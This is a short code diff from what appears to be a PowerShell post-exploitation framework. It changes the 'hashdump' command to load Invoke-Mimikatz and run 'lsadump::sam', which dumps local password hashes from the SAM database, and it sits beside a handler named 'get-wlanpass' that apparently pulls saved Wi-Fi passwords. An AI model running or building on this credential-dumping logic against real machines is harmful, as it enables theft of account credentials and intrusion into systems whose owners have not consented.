@@ -881,8 +881,8 @@ param
             }
             if ($pscommand.ToLower().StartsWith('hashdump'))
             { 
-                CheckModuleLoaded "Invoke-Powerdump.ps1" $psrandomuri
-                $pscommand = "Invoke-Powerdump"
+                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
+                $pscommand = "Invoke-Mimikatz -Command `'`"lsadump::sam`"`'"
             }
             if ($pscommand.ToLower().StartsWith('get-wlanpass'))
             { 
